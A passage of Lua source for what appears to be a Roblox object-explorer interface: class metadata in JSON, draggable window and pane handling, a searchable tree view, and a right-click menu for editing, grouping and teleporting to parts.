GUI object to represent draggable arc handles","ExplorerOrder":20,"ExplorerImageIndex":56,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SelectionBox","Summary":"A 3D GUI object to represent the visible selection around an object","ExplorerOrder":21,"ExplorerImageIndex":54,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SelectionSphere","Summary":"A 3D GUI object to represent the visible selection around an object","ExplorerOrder":21,"ExplorerImageIndex":54,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SurfaceSelection","Summary":"A 3D GUI object to represent the visible selection around a face of an object","ExplorerOrder":21,"ExplorerImageIndex":55,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Configuration","Summary":"An object that can be placed under parts to hold Value objects that represent that part's configuration","ExplorerOrder":22,"ExplorerImageIndex":58,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Folder","Summary":"An object that can be created to hold and organize objects","ExplorerOrder":1,"ExplorerImageIndex":77,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SelectionPartLasso","Summary":"A visual line drawn representation between two part objects","ExplorerOrder":22,"ExplorerImageIndex":57,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"SelectionPointLasso","Summary":"A visual line drawn representation between two positions","ExplorerOrder":22,"ExplorerImageIndex":57,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"PartPairLasso","Summary":"A visual line drawn representation between two parts.","ExplorerOrder":22,"ExplorerImageIndex":57,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Pose","Summary":"The pose of a joint relative to it's parent part in a keyframe","ExplorerOrder":22,"ExplorerImageIndex":60,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Keyframe","Summary":"One keyframe of an animation","ExplorerOrder":22,"ExplorerImageIndex":60,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Animation","Summary":"Represents a linked animation object, containing keyframes and poses.","ExplorerOrder":22,"ExplorerImageIndex":60,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AnimationTrack","Summary":"Returned by a call to LoadAnimation. Controls the playback of an animation on a Humanoid.","ExplorerOrder":22,"ExplorerImageIndex":60,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AnimationController","Summary":"Allows animations to be played on joints of the parent object.","ExplorerOrder":22,"ExplorerImageIndex":60,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CharacterMesh","Summary":"Modifies the appearance of a body part.","ExplorerOrder":22,"ExplorerImageIndex":60,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Dialog","Summary":"An object used to make dialog trees to converse with players","ExplorerOrder":22,"ExplorerImageIndex":62,"Browsable":true,"PreferredParent":"","Members":[{"Name":"ConversationDistance","Summary":"The maximum distance that the player's character can be from the dialog's parent in order to use the dialog.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GoodbyeChoiceActive","Summary":"Indicates whether or not an extra choice is available for the player to exit the dialog tree at this node.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GoodbyeDialog","Summary":"The prompt text for an extra choice that allows the player to exit the dialog tree at this node.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InUse","Summary":"Indicates whether or not the dialog is currently being used by one or more players.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InitialPrompt","Summary":"The chat message that is displayed to the player when they first activate the dialog.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Purpose","Summary":"Describes the purpose of the dialog, which is used to display a relevant icon on the dialog's activation button.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Tone","Summary":"Describes the tone of the dialog, which is used to display a relevant color in the dialog interface.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BehaviorType","Summary":"Indicates how the dialog may be used by players. Use Enum.DialogBehaviorType.SinglePlayer if only one player should interact with the dialog at a time, otherwise use Enum.DialogBehaviorType.MultiplePlayers.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetCurrentPlayers","Summary":"Returns an array of the players currently conversing with this dialog.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DialogChoice","Summary":"An object used to make dialog trees to converse with players","ExplorerOrder":22,"ExplorerImageIndex":63,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UnionOperation","Summary":"A UnionOperation is a union of multiple parts","ExplorerOrder":2,"ExplorerImageIndex":73,"Browsable":"true","PreferredParent":"","Members":[{"Name":"UsePartColor","Summary":"Override the colors of the mesh with the part color.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NegateOperation","Summary":"A NegateOperation can be used to create holes in other parts","ExplorerOrder":2,"ExplorerImageIndex":72,"Browsable":"true","PreferredParent":"","Members":[{"Name":"UsePartColor","Summary":"Override the colors of the mesh with the part color.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MeshPart","Summary":"A MeshPart is a physically simulatable mesh","ExplorerOrder":2,"ExplorerImageIndex":73,"Browsable":"true","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Terrain","Summary":"Object representing a high performance bounded grid of static 4x4 parts","ExplorerOrder":0,"ExplorerImageIndex":65,"Browsable":"true","PreferredParent":"","Members":[{"Name":"WaterTransparency","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WaterWaveSize","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WaterWaveSpeed","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WaterReflectance","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetCell","Summary":"Returns CellMaterial, CellBlock, CellOrientation","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetWaterCell","Summary":"Returns hasAnyWater, WaterForce, WaterDirection","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetWaterCell","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Light","Summary":"Parent of all light objects","ExplorerOrder":3,"ExplorerImageIndex":13,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Brightness","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PointLight","Summary":"Makes the parent part emit light in a spherical shape","ExplorerOrder":3,"ExplorerImageIndex":13,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Range","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SpotLight","Summary":"Makes the parent part emit light in a conical shape","ExplorerOrder":3,"ExplorerImageIndex":13,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Range","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Angle","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SurfaceLight","Summary":"Makes the parent part emit light in a frustum shape from rectangle defined by part","ExplorerOrder":3,"ExplorerImageIndex":13,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Range","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Brightness","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Angle","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RemoteFunction","Summary":"Allow functions defined in one script to be called by another script across client/server boundary","ExplorerOrder":4,"ExplorerImageIndex":74,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RemoteEvent","Summary":"Allow events defined in one script to be subscribed to by another script across client/server boundary","ExplorerOrder":5,"ExplorerImageIndex":75,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TerrainRegion","Summary":"Object representing a snapshot of the region of terrain","ExplorerOrder":2,"ExplorerImageIndex":65,"Browsable":"true","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ModuleScript","Summary":"A script fragment. Only runs when another script uses require() on it.","ExplorerOrder":5,"ExplorerImageIndex":76,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false}]]==]
        -- TODO: Show critical error
    end
    rawRMD = Services.HttpService:JSONDecode(rawRMD)

	local RMD = {}
	for _,v in pairs(rawRMD) do
		RMD[v.Name] = v
	end

    return RMD
end

function f.checkInPane(window)
	local inPane = false
	for i,v in pairs(LPaneItems) do if v.Window == window then inPane = true end end
	for i,v in pairs(RPaneItems) do if v.Window == window then inPane = true end end
	return inPane
end

function f.transGui(gui,num)
	if gui:IsA("GuiObject") then gui.BackgroundTransparency = num end
	if gui:IsA("TextBox") or gui:IsA("TextLabel") then gui.TextTransparency = num
	elseif gui:IsA("ImageButton") or gui:IsA("ImageLabel") then gui.ImageTransparency = num end
	for i,v in pairs(gui:GetChildren()) do
		f.transGui(v,num)
	end
end

function f.hookWindowListener(window)
	local selected = false
	local user = Services.UserInputService
	
	window.TopBar.InputBegan:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			selected = true
			local selectedInit = false
			local initPos = {mouse.X,mouse.Y}
			local dragOffX,dragOffY = mouse.X-window.TopBar.AbsolutePosition.X,mouse.Y-window.TopBar.AbsolutePosition.Y
			local inPane = false
			local releaseEvent
			local mouseEvent
			
			for i,v in pairs(LPaneItems) do if v.Window == window then inPane = true end end
			for i,v in pairs(RPaneItems) do if v.Window == window then inPane = true end end
			
			releaseEvent = user.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
				releaseEvent:Disconnect()
				if mouseEvent then mouseEvent:Disconnect() end
				selected = false
				if setPane ~= "None" then window.Position = window.Position - UDim2.new(0,gui.AbsoluteSize.X-300,0,0) f.addToPane(window,setPane) end
				mouseWindow = nil
			end)
			
			mouseEvent = user.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement and (selectedInit or f.distance(initPos[1],initPos[2],mouse.X,mouse.Y) >= (inPane and 20 or 5)) then
					if not selectedInit then selectedInit = true window.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY) window.Parent = nil end
					for i,v in pairs(LPaneItems) do if v.Window == window then f.removeFromPane(window,"Left") break end end
					for i,v in pairs(RPaneItems) do if v.Window == window then f.removeFromPane(window,"Right") break end end
					
					mouseWindow = window
					
					window.Parent = gui
					window.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
					window.Size = UDim2.new(0,window.Size.X.Offset,0,300)
				end
			end)
		end
	end)
	
	--window.TopBar.InputEnded:connect(function(input)
	--	if input.UserInputType == Enum.UserInputType.MouseButton1 then
	--		print("OH")
	--	end
	--end)
	
	window.InputBegan:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			local inPane = f.checkInPane(window)
			
			if inPane then return end
			
			for i,v in pairs(activeWindows) do
				if v ~= window then
					if f.checkMouseInGui(v) and not f.checkInPane(v) then return end
				end
			end			
			
			window.Parent = nil
			window.Parent = gui
		end
	end)
	
	window.TopBar.Close.MouseEnter:connect(function()
		window.TopBar.Close.BackgroundTransparency = 0.5
	end)
	
	window.TopBar.Close.MouseLeave:connect(function()
		window.TopBar.Close.BackgroundTransparency = 1
	end)
	
	window.TopBar.Close.MouseButton1Click:connect(function()
		if f.checkInPane(window) then f.removeFromPane(window) window.Visible = false return end
		window.Content:TweenSize(UDim2.new(1,-4,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quad,0.4,true)
		wait(0.4)
		window.Visible = false
	end)
end

-- Explorer Functions

function f.tabIsA(tab,class)
	for i,v in pairs(tab) do
		if v:IsA(class) then
			return true
		end
	end
	return false
end

function f.hasChildren(tab)
	for i,v in pairs(tab) do
		if #v:GetChildren() > 0 then
			return true
		end
	end
	return false
end

function f.tabHasChar(tab)
	local players = Services.Players
	for i,v in pairs(tab) do
		if players:GetPlayerFromCharacter(v) then
			return true
		end
	end
	return false
end

function f.expandAll(obj)
	local node = nodes[obj]
	while node do
		explorerTree.Expanded[node] = true
		node = node.Parent
	end
end

function f.rightClick()
	rightClickContext:Clear()
	
	local selection = explorerTree.Selection	
	
	-- Cut
	rightClickContext:Add({Name = "Cut", Icon = f.icon(nil,iconIndex.CUT_ICON), DisabledIcon = f.icon(nil,iconIndex.CUT_D_ICON), Shortcut = "Ctrl+X", Disabled = #selection.List == 0, OnClick = function()
		print("CUT")
		pcall(function()
			clipboard = {}
			for i,v in pairs(selection.List) do
				table.insert(clipboard,v:Clone())
				v:Destroy()
			end
		end)
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Copy", Icon = f.icon(nil,iconIndex.COPY_ICON), DisabledIcon = f.icon(nil,iconIndex.COPY_D_ICON), Shortcut = "Ctrl+C", Disabled = #selection.List == 0, OnClick = function()
		print("COPY")
		pcall(function()
			clipboard = {}
			for i,v in pairs(selection.List) do
				table.insert(clipboard,v:Clone())
			end
		end)
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Paste Into", Icon = f.icon(nil,iconIndex.PASTE_ICON), DisabledIcon = f.icon(nil,iconIndex.PASTE_D_ICON), Shortcut = "Ctrl+B", Disabled = #clipboard == 0, OnClick = function()
		print("PASTE")
		pcall(function()
			for i,v in pairs(selection.List) do
				for _,copy in pairs(clipboard) do
					copy:Clone().Parent = v
				end
			end
		end)
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Duplicate", Icon = f.icon(nil,iconIndex.COPY_ICON), DisabledIcon = f.icon(nil,iconIndex.COPY_D_ICON), Shortcut = "Ctrl+D", Disabled = #selection.List == 0, OnClick = function()
		print("DUPLICATE")
		pcall(function()
			for i,v in pairs(selection.List) do
				v:Clone().Parent = v.Parent
			end
		end)
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Delete", Icon = f.icon(nil,iconIndex.DELETE_ICON), DisabledIcon = f.icon(nil,iconIndex.DELETE_D_ICON), Shortcut = "Del", Disabled = #selection.List == 0, OnClick = function()
		print("DELETE")
		pcall(function()
			for i,v in pairs(selection.List) do
				v:Destroy()
			end
		end)
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Rename", Icon = "", DisabledIcon = "", Shortcut = "Ctrl+R", Disabled = #selection.List == 0, OnClick = function()
		print("RENAME")
	end})
	
	rightClickContext:AddDivider()
	
	rightClickContext:Add({Name = "Group", Icon = f.icon(nil,iconIndex.GROUP_ICON), DisabledIcon = f.icon(nil,iconIndex.GROUP_D_ICON), Shortcut = "Ctrl+G", Disabled = #selection.List == 0, OnClick = function()
		print("GROUP")
		local base = selection.List[1]
		local model = Instance.new("Model",base.Parent)
		for i,v in pairs(selection.List) do
			v.Parent = model
		end
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Ungroup", Icon = f.icon(nil,iconIndex.UNGROUP_ICON), DisabledIcon = f.icon(nil,iconIndex.UNGROUP_D_ICON), Shortcut = "Ctrl+U", Disabled = not f.tabIsA(selection.List,"Model"), OnClick = function()
		print("UNGROUP")
		for i,v in pairs(selection.List) do
			if v:IsA("Model") then
				for _,child in pairs(v:GetChildren()) do
					child.Parent = v.Parent
				end
				v:Destroy()
			end
		end
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Select Children", Icon = f.icon(nil,iconIndex.SELECTCHILDREN_ICON), DisabledIcon = f.icon(nil,iconIndex.SELECTCHILDREN_D_ICON), Shortcut = "", Disabled = not f.hasChildren(selection.List), OnClick = function()
		print("SELECT CHILDREN")
		local oldSel = selection.List
		selection.List = {}
		selection.Selected = {}
		for i,v in pairs(oldSel) do
			for _,child in pairs(v:GetChildren()) do
				explorerTree.Selection:Add(child)
				f.expandAll(child.Parent)
			end
		end
		explorerTree:TreeUpdate()
		explorerTree:Refresh()
		rightClickContext:Hide()
	end})
	
	rightClickContext:Add({Name = "Jump To Parent", Icon = "", DisabledIcon = "", Shortcut = "", Disabled = #selection.List == 0, OnClick = function()
		print("JUMP TO PARENT")
		local oldSel = selection.List
		selection.List = {}
		selection.Selected = {}
		for i,v in pairs(oldSel) do
			if v.Parent ~= nil then
				selection:Add(v.Parent)
			end
		end
		explorerTree:Refresh()
		rightClickContext:Hide()
	end})
	
	-- Parts
	if f.tabIsA(selection.List, "BasePart") or f.tabIsA(selection.List, "Model") then
		rightClickContext:AddDivider()
		
		rightClickContext:Add({Name = "Teleport To", Icon = "", DisabledIcon = "", Shortcut = "", Disabled = #selection.List == 0, OnClick = function()
			print("TELEPORT TO")
			for i,v in pairs(selection.List) do
				if v:IsA("BasePart") then
					Services.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
					break;
				end
			end
			rightClickContext:Hide()
		end})
		
		rightClickContext:Add({Name = "Teleport Here", Icon = "", DisabledIcon = "", Shortcut = "", Disabled = #selection.List == 0, OnClick = function()
			print("TELEPORT HERE")
			rightClickContext:Hide()
		end})
	end
	
	-- Player
	local hasPlayer = false	
	
	if f.tabIsA(selection.List, "Player") then
		hasPlayer = true
		rightClickContext:AddDivider()
		
		rightClickContext:Add({Name = "Jump To Character", Icon = "", DisabledIcon = "", Shortcut = "", Disabled = #selection.List == 0, OnClick = function()
			print("JUMP TO CHARACTER")
			rightClickContext:Hide()
		end})
	end
	
	if f.tabHasChar(selection.List) then
		if not hasPlayer then rightClickContext:AddDivider() end
		
		rightClickContext:Add({Name = "Jump To Player", Icon = "", DisabledIcon = "", Shortcut = "", Disabled = #selection.List == 0, OnClick = function()
			print("JUMP TO PLAYER")
			rightClickContext:Hide()
		end})
	end
	
	rightClickContext:Refresh()
	rightClickContext:Show(gui,mouse.X,mouse.Y)
end

function f.newExplorer()
	local newgui = getResource("ExplorerPanel")
	local explorerScroll = ScrollBar.new()
	local explorerScrollH = ScrollBar.new(true)
	local newTree = TreeView.new()
	newTree.Scroll = explorerScroll
	newTree.DisplayFrame = newgui.Content.List
	newTree.TreeUpdate = f.updateTree
	newTree.SearchText = ""
	newTree.SearchExpanded = {}
	
	local nameEvents = {}
	
	newTree.PreUpdate = function(self)
		for i,v in pairs(nameEvents) do v:Disconnect() nameEvents[i] = nil end
	end
	
	newTree.NodeCreate = function(self,entry,i)
		entry.Indent.IconFrame.Icon.Image = iconMap
		
		entry.MouseEnter:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if self.Selection.Selected[node.Obj] then return end
				if rightClickContext.Frame.Parent ~= nil and f.checkMouseInGui(rightClickContext.Frame) then return end
				entry.BackgroundTransparency = 0.7
			end
		end)
		entry.MouseLeave:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if self.Selection.Selected[node.Obj] then return end
				entry.BackgroundTransparency = 1
			end
		end)						
		entry.MouseButton1Down:Connect(function()
			local node = self.Tree[i + self.Index]
			if Services.UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
				self.Selection:Add(node.Obj)
			else
				self.Selection:Set({node.Obj})
			end
			self:Refresh()
			propertiesTree:TreeUpdate()
			propertiesTree:Refresh()
		end)
		entry.MouseButton2Down:Connect(function()
			local node = self.Tree[i + self.Index]
			rightEntry = entry
			rightClickContext.Frame.Parent = nil
			if not self.Selection.Selected[node.Obj] then
				self.Selection:Set({node.Obj})
			end
			self:Refresh()
		end)
		entry.MouseButton2Up:Connect(function()
			if rightEntry and f.checkMouseInGui(rightEntry) then
				f.rightClick()
			end
		end)
						
		entry.Indent.Expand.MouseEnter:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if (not self.SearchResults and self.Expanded[node]) or (self.SearchResults and self.SearchExpanded[node.Obj]) then
					f.icon(entry.Indent.Expand,iconIndex.NodeExpandedOver)
				else
					f.icon(entry.Indent.Expand,iconIndex.NodeCollapsedOver)
				end
			end
		end)
		entry.Indent.Expand.MouseLeave:Connect(function()
			local node = self.Tree[i + self.Index]
			if node then
				if (not self.SearchResults and self.Expanded[node]) or (self.SearchResults and self.SearchExpanded[node.Obj]) then
					f.icon(entry.Indent.Expand,iconIndex.NodeExpanded)
				else
					f.icon(entry.Indent.Expand,iconIndex.NodeCollapsed)
				end
			end
		end)
		entry.Indent.Expand.MouseButton1Down:Connect(function()
			local node = self.Tree[i + self.Index]
			if node and not self.SearchResults then
				self:Expand(node)
			else
				if self.SearchExpanded[node.Obj] then
					self.SearchExpanded[node.Obj] = nil
				else
					self.SearchExpanded[node.Obj] = 2
				end
				if self.TreeUpdate then self:TreeUpdate() end
				self:Refresh()
			end
		end)
	end
	
	newTree.NodeDraw = function(self,entry,node)
		f.icon(entry.Indent.IconFrame,iconIndex[node.Obj.ClassName] or 0)
		entry.Indent.EntryName.Text = node.Obj.Name									
		if #node > 0 then
			entry.Indent.Expand.Visible = true
			if (not self.SearchResults and self.Expanded[node]) or (self.SearchResults and self.SearchExpanded[node.Obj] == 2) then
				f.icon(entry.Indent.Expand,iconIndex.NodeExpanded)
			else
				f.icon(entry.Indent.Expand,iconIndex.NodeCollapsed)
			end
			if self.SearchExpanded[node.Obj] == 1 then
				entry.Indent.Expand.Visible = false
			end
		else
			entry.Indent.Expand.Visible = false
		end
		
		if node.Obj.Parent ~= node.Parent.Obj then
			spawn(function() f.moveObject(node.Obj,node.Obj.Parent) end)
		end
					
		if self.Selection.Selected[node.Obj] then
			entry.Indent.EntryName.TextColor3 = Color3.new(1,1,1)
			entry.BackgroundTransparency = 0
		else
			entry.Indent.EntryName.TextColor3 = Color3.new(220/255, 220/255, 220/255)
			entry.BackgroundTransparency = 1
		end
		
		nameEvents[node.Obj] = node.Obj:GetPropertyChangedSignal("Name"):Connect(function()
			entry.Indent.EntryName.Text = node.Obj.Name
		end)
					
		entry.Indent.Position = UDim2.new(0,18*node.Depth,0,0)
		entry.Size = UDim2.new(0,nodeWidth+10,0,18)
	end
	
	explorerScroll.Gui.Parent = newgui.Content
	explorerScroll:Texture({
		FrameColor = Color3.new(80/255,80/255,80/255),
		ThumbColor = Color3.new(120/255,120/255,120/255),
		ThumbSelectColor = Color3.new(140/255,140/255,140/255),
		ButtonColor = Color3.new(163/255,162/255,165/255),
		ArrowColor = Color3.new(220/255,220/255,220/255)
	})
	explorerScroll:SetScrollFrame(newgui.Content,3)
	
	explorerScrollH.Gui.Visible = false
	explorerScrollH.Gui.Parent = newgui.Content
	explorerScrollH:Texture({
		FrameColor = Color3.new(80/255,80/255,80/255),
		ThumbColor = Color3.new(120/255,120/255,120/255),
		ThumbSelectColor = Color3.new(140/255,140/255,140/255),
		ButtonColor = Color3.new(163/255,162/255,165/255),
		ArrowColor = Color3.new(220/255,220/255,220/255)
	})
	explorerScrollH.Gui.Position = UDim2.new(0,0,1,-16)
	explorerScrollH.Gui.Size = UDim2.new(1,-16,0,16)
	
	newTree.OnUpdate = function(self)
		local guiX = explorerPanel.Content.AbsoluteSize.X-16
		explorerScrollH.VisibleSpace = guiX
		explorerScrollH.TotalSpace = nodeWidth+10
		if nodeWidth > guiX then
			explorerScrollH.Gui.Visible = true
			explorerScroll.Gui.Size = UDim2.new(0,16,1,-16)
			self.DisplayFrame.Size = UDim2.new(1,-16,1,-16)
		else
			explorerScrollH.Gui.Visible = false
			explorerScroll.Gui.Size = UDim2.new(0,16,1,0)
			self.DisplayFrame.Size = UDim2.new(1,-16,1,0)
		end
		explorerScroll.TotalSpace = #self.Tree + 1
		explorerScroll.VisibleSpace = math.ceil(self.DisplayFrame.AbsoluteSize.Y / 19)
		explorerScrollH:Update()		
		explorerScroll:Update()
	end
	explorerScroll.OnUpdate = function(self) if newTree.Index == self.Index then return end newTree.Index = self.Index newTree:Refresh() end
	explorerScrollH.OnUpdate = function(self)
		for i,v in pairs(explorerTree.Entries) do
			v.Position = UDim2.new(0,1-self.Index,0,v.Position.Y.Offset)
		end
	end
	--explorerData = {Window = newgui, NodeData = {}, Scroll = explorerScroll, Entries = {}}
	
	explorerTree = newTree
	
	table.insert(activeWindows,newgui)
	f.hookWindowListener(newgui)
	newgui.Changed:connect(function(prop) if prop == "AbsoluteSize" or prop == "AbsolutePosition" then newTree:Refresh() end end)
	
	local searchBox = newgui.TopBar.SearchFrame.Search
	local searchAnim = searchBox.Parent.Entering
	searchBox:GetPropertyChangedSignal("Text"):Connect(function()
		local searchTime = tick()
		lastSearch = searchTime
		wait()
		if lastSearch ~= searchTime then return end
		newTree.SearchText = searchBox.Text
		f.updateSearch(newTree)
		explorerTree:TreeUpdate()
		explorerTree:Refresh()
	end)
	
	searchBox.Focused:Connect(function()
		searchBox.Empty.Visible = false
		searchAnim:TweenSizeAndPosition(UDim2.new(1,0,0,2),UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	end)
	
	searchBox.FocusLost:Connect(function()
		if searchBox.Text == "" then searchBox.Empty.Visible = true else searchBox.Empty.Visible = false end
		searchAnim:TweenSizeAndPosition(UDim2.new(0,0,0,2),UDim2.new(0.5,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	end)
	
	return newgui
end

function f.refreshExplorer()
	--if updateDebounce then return end
	--updateDebounce = true
	--Services.RunService.RenderStepped:wait()
	--updateDebounce = false
	explorerTree:Refresh()
end

function f.makeWindow(name)
	local newWindow = getResource(name)
	
	table.insert(activeWindows,newWindow)
	f.hookWindowListener(newWindow)
	
	return newWindow
end

function f.getRMDOrder(class)
	local currentClass = API.Classes[class]
	while currentClass do
		if RMD[currentClass.Name] and RMD[currentClass.Name].ExplorerOrder then return RMD[currentClass.Name].ExplorerOrder end
		currentClass = API.Classes[currentClass.Superclass]
	end
	return 999
end

function f.reDepth(node,depth)
	for i,v in ipairs(node) do
		v.Depth = depth + 1
		f.reDepth(node[i], depth + 1)
	end
end

function f.moveObject(obj,par)
	ypcall(function()
		if obj.Parent == nil then return end
		local node = nodes[obj]
		local newNode = nodes[par]
		if node and newNode then
			local parNode = node.Parent
			for i,v in ipairs(parNode) do
				if v == node then
					table.remove(parNode,i)
					break
				end
			end
			
			node.Depth = f.depth(par) + 1
			f.reDepth(node,node.Depth)
			
			node.Parent = newNode
			newNode.Sorted = nil
			table.insert(newNode,node)
		
			if not updateDebounce then
				updateDebounce = true
				wait()
				updateDebounce = false
				explorerTree:TreeUpdate()
				f.refreshExplorer()
			end
		end
	end)
end

function f.addObject(obj,noupdate,recurse)
	ypcall(function()
		local access = obj.Changed
		if not nodes[obj.Parent] then return end
		local newNode = {
			Obj = obj,
			Parent = nodes[obj.Parent],
			--Ind = #nodes[obj.Parent] + 1,
			ExplorerOrder = f.getRMDOrder(obj.ClassName),
			Depth = f.depth(obj),
			UID = tick()--RMD[v.ClassName] and (RMD[v.ClassName].ExplorerOrder or 999) or 999
		}
		if newNode.ExplorerOrder <= 0 and not obj:IsA("Workspace") and obj.Parent == game then newNode.ExplorerOrder = 999 end
		nodes[obj] = newNode
		newNode.Parent.Sorted = nil
		table.insert(newNode.Parent,newNode)
		
		newNode.AncestryEvent = obj.AncestryChanged:Connect(function(child,par)
			spawn(function()
				if child == obj then
					f.moveObject(obj,par)
				end
			end)
		end)
		
		newNode.AddedEvent = obj.ChildAdded:Connect(function(child)
			f.addObject(child,false,true)
		end)
		
		newNode.RemovedEvent = obj.ChildRemoved:Connect(function(child)
			f.removeObject(child,false,true)
		end)
		
		if recurse then
			for i,v in pairs(obj:GetDescendants()) do
				f.addObject(v,true)
			end
		end
		
		if not noupdate then
			if explorerTree.SearchChecks and explorerTree.SearchResults then
				for i,v in pairs(explorerTree.SearchChecks) do
					local success,found = pcall(v,obj)
					if found then
						explorerTree.SearchResults[obj] = true
						explorerTree.SearchExpanded[obj] = math.max(explorerTree.SearchExpanded[v] or 0, 1)
						local par = obj.Parent
						while par and not explorerTree.SearchResults[par] or explorerTree.SearchExpanded[par] == 1 do
							explorerTree.SearchResults[par] = true
							explorerTree.SearchExpanded[par] = 2
							par = par.Parent
						end
					end
				end
			end
			
			if not updateDebounce then
				updateDebounce = true
				wait()
				updateDebounce = false
				explorerTree:TreeUpdate()
				f.refreshExplorer()
			end
		end
		-- TODO: Maybe ypcall?
	end)
end

function f.nodeDescendants(node,descendants)
	for i,v in ipairs(node) do
